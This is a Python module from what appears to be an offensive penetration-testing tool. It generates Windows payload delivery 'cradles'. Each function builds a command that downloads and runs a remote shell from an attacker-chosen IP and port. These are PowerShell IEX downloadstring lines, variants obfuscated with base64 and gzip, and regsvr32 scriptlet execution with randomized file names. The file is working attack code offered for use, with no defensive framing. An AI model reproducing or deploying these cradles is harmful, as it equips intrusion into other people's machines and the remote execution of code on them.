import base64,os,random,string,gzip 
from io import StringIO
from lib import arguments, shells

class Cradle:
	def __init__(self,name,payload,execution):
		self.name = name
		self.payload = payload
		self.execution = execution

args = arguments.get_args()

def write_cradle_shell(filename,content):
	if args.randomize_names:
		filename = ''.join(random.choice(string.ascii_lowercase) for i in range(12))

	if not os.path.exists(args.payload_directory):
		os.mkdir(args.payload_directory)

	path = args.payload_directory + filename
	destination_file = open(path, "w")
	destination_file.write(content)
	destination_file.close()
	return filename

def powershell_IEX_raw(all_shells):
	cradles = []
	for shell in all_shells:
		name = 'IEX Raw: %a' % shell.name
		execution ="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (args.ip_address, args.web_delivery, shell.filename)
		cradle = Cradle(name,shell.filename,execution)
		cradles.append(cradle)
	return cradles

def powershell_IEX_b64(all_shells):
	cradles = []
	for shell in all_shells:
		name = 'IEX Base64: %a' % shell.name
		raw_payload = "IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (args.ip_address, args.web_delivery, shell.filename)
		payload = base64.b64encode(raw_payload.encode('utf-16-le')).decode('utf-8')
		execution = "powershell.exe -nop -e %s" % payload
		cradle = Cradle(name,payload,execution)
		cradles.append(cradle)
	return cradles	

def powershell_IEX_gzip(all_shells):
	cradles = []
	out = StringIO()
	for shell in all_shells:
		name = 'IEX GZIP: %a' % shell.name
		raw_payload = "IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (args.ip_address, args.web_delivery, shell.filename)
		bytes_payload = bytes(raw_payload, 'utf-8')
		out = gzip.compress(bytes_payload)
		gzip_payload = base64.b64encode(out).decode("utf-8")
		b64_gzip_payload = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzip_payload
		payload = base64.b64encode(b64_gzip_payload.encode('UTF-16LE')).decode("utf-8")
		execution = "powershell.exe -nop -e %s" % payload
		cradle = Cradle(name,payload,execution)
		cradles.append(cradle)
	return cradles	

def regsvr32(all_shells):
	cradles = []
	for shell in all_shells:
		name = 'Regsvr32: %a' % shell.name
		raw_payload = "IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (args.ip_address, args.web_delivery, shell.filename)
		payload = base64.b64encode(raw_payload.encode('utf-16-le')).decode('utf-8')
		regsvr32_script_content = open(args.resource_directory+'regsvr32.xml').read() # read the scriptlet data
		content = regsvr32_script_content.replace('TEMPLATEPAYLOAD',payload)
		sct_filename = 'regsvr32_%s.sct' % ''.join(random.choice(string.ascii_lowercase) for i in range(12))
		path_to_payload = write_cradle_shell(sct_filename,content)
		execution = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (args.ip_address,args.web_delivery,path_to_payload)
		cradle = Cradle(name,payload,execution)
		cradles.append(cradle)
	return cradles

def generate_all_cradles(all_shells):
	powershell_IEX_raw_cradles = powershell_IEX_raw(all_shells)
	powershell_IEX_b64_cradles = powershell_IEX_b64(all_shells)
	powershell_IEX_gzip_cradles = powershell_IEX_gzip(all_shells)
	regsvr32_cradles = regsvr32(all_shells)
	return powershell_IEX_raw_cradles + powershell_IEX_b64_cradles + powershell_IEX_gzip_cradles +regsvr32_cradles